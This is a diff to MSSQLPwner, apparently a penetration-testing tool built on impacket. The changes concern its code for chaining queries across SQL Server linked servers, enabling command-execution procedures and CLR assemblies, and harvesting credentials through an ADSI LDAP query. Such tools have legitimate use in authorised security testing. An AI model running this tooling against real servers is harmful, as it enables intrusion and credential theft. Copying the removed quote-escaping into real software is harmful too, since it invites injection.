@@ -2,7 +2,7 @@
 ########################################################
 __author__ = ['Nimrod Levy']
 __license__ = 'GPL v3'
-__version__ = 'v1.0-beta'
+__version__ = 'v1.1'
 __email__ = ['El3ct71k@gmail.com']
 
 ########################################################
@@ -13,10 +13,10 @@ import time
 import logging
 import utilities
 from impacket import LOG
-from typing import Literal
 from typing import Callable
 from impacket import version
 from playbooks import Queries
+from typing import Literal, Union
 from impacket.examples import logger
 from base_sql_client import BaseSQLClient
 from impacket.examples.utils import parse_target
@@ -29,7 +29,7 @@ class MSSQLPwner(BaseSQLClient):
         self.debug = args_options.debug
         self.state = {
             "linkable_servers": dict(), "impersonation_users": dict(), "authentication_users": dict(),
-            "impersonation_history": dict(), "authentication_history": dict(), "hostname": None,
+            "impersonation_history": dict(), "authentication_history": dict(),
             "adsi_provider_servers": dict()
         }
         self.rev2self = dict()
@@ -46,14 +46,16 @@ class MSSQLPwner(BaseSQLClient):
         if not rows['is_success']:
             LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
             return
+
         if not rows['results']:
             LOG.info(f"No linkable servers found on {linked_server}")
             return
 
         for row in rows['results']:
-            linkable_server = utilities.remove_service_name(row['SRV_NAME'].upper())
-            if not linkable_server:
+            if not row['SRV_NAME']:
                 continue
+
+            linkable_server = utilities.remove_service_name(row['SRV_NAME'].upper())
             is_adsi_provider = True if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject" else False
             linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
             if is_adsi_provider:
@@ -91,14 +93,13 @@ class MSSQLPwner(BaseSQLClient):
         """
         method_func = utilities.build_exec_at if method == "exec_at" else utilities.build_openquery
         chained_query = query
+        flow = flow[1:] if flow[0] == self.hostname else flow # If the first server is the current server, remove it
         for link in flow[::-1]:  # Iterates over the linked servers
-            if link == self.hostname:
-                continue
             chained_query = method_func(link, chained_query)
         return chained_query
 
     def build_linked_query_chain(self, linked_server: str, query: str,
-                                 method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]) -> str:
+                                 method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]) -> Union[str, None]:
         """
         This function is responsible to split a linked server path string in order to build chained queries through the
          linked servers using the OpenQuery or exec function.
@@ -107,9 +108,11 @@ class MSSQLPwner(BaseSQLClient):
             OpenQuery(Server1, 'OpenQuery(Server2, ''OpenQuery(Server3, '''query''')'')')
             EXEC ('EXEC (''EXEC ('''query''') AT Server3'') AT Server2') AT Server1
         """
+        if not linked_server:
+            return query
         if linked_server not in self.state['linkable_servers'].keys():
             LOG.error(f"Server {linked_server} is not linkable from {self.hostname}")
-            return query
+            return None
         return self.build_query_chain(self.state['linkable_servers'][linked_server], query, method)
 
     def build_chain(self, query: str, linked_server: str,
@@ -122,6 +125,10 @@ class MSSQLPwner(BaseSQLClient):
             if method == "blind_OpenQuery":
                 query = f"SELECT 1; {query}"
             query = self.build_linked_query_chain(linked_server, query, method)
+            if not query:
+                LOG.error("Failed to build query chain")
+                return {'is_success': False, 'results': None}
+
         return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)
 
     def get_impersonation_users(self, linked_server: str) -> None:
@@ -239,14 +246,13 @@ class MSSQLPwner(BaseSQLClient):
         """
         This function is responsible to execute a procedure on a linked server.
         """
-
-        if not self.reconfigure_procedure(procedure, linked_server, permission_is_required=True, required_status=True):
-            return False
         if not self.reconfigure_procedure("show advanced options", linked_server, permission_is_required=False,
                                           required_status=True):
             return False
 
-        command = utilities.escape_single_quotes(command)
+        if not self.reconfigure_procedure(procedure, linked_server, permission_is_required=True, required_status=True):
+            return False
+
         if procedure == 'sp_oacreate':
             procedure_query = Queries.SP_OAMETHOD.format(command=command)
         else:
@@ -272,13 +278,14 @@ class MSSQLPwner(BaseSQLClient):
             return False
 
         custom_asm_hex = utilities.hexlify_file(asm_file_location)
-        if not self.reconfigure_procedure('clr enabled', linked_server, permission_is_required=False,
-                                          required_status=True):
-            LOG.error("Failed to enable clr")
-            return False
         if not self.reconfigure_procedure('show advanced options', linked_server, permission_is_required=False,
                                           required_status=True):
             LOG.error("Failed to enable show advanced options")
+            return False
+
+        if not self.reconfigure_procedure('clr enabled', linked_server, permission_is_required=False,
+                                          required_status=True):
+            LOG.error("Failed to enable clr")
             return False
 
         if not self.reconfigure_procedure('clr strict security', linked_server, permission_is_required=False,
@@ -325,8 +332,7 @@ class MSSQLPwner(BaseSQLClient):
         self.add_rev2self_cmd(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
         self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))
 
-        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name,
-                                                             command=utilities.escape_single_quotes(command))
+        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
         results = self.build_chain(procedure_query, linked_server, method="exec_at")
         if not results['is_success']:
             LOG.error(f"Failed to execute custom assembly")
@@ -356,8 +362,7 @@ class MSSQLPwner(BaseSQLClient):
             LOG.error(f"Failed to create procedure")
             return False
 
-        function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name,
-                                                           command=utilities.escape_single_quotes(command))
+        function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)
 
         if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
             LOG.error(f"Failed to execute custom assembly")
@@ -442,7 +447,6 @@ class MSSQLPwner(BaseSQLClient):
         for linked_server, command in self.rev2self.items():
             if not command:
                 continue
-
             if self.build_chain("".join(command), linked_server, "exec_at")['is_success']:
                 LOG.info(f"Successfully reverted to self on {linked_server}")
             self.rev2self[linked_server].clear()
@@ -519,7 +523,7 @@ class MSSQLPwner(BaseSQLClient):
                 client.connect(username, password, domain)
                 LOG.setLevel(logging.INFO)
                 client.options.debug = self.options.debug
-                chained_query = self.build_query_chain(chain, f"SELECT * FROM 'LDAP://localhost:{port}' ", "OpenQuery")
+                chained_query = self.build_query_chain(chain, Queries.LDAP_QUERY.format(port=port), "OpenQuery")
 
                 client.custom_sql_query(chained_query, wait=True)
                 client.disconnect()
@@ -609,5 +613,4 @@ if __name__ == '__main__':
         mssql_client.retrieve_password(link_server, options.listen_port, options.adsi_provider)
 
     mssql_client.rev2self_cmd()
-
     mssql_client.disconnect()
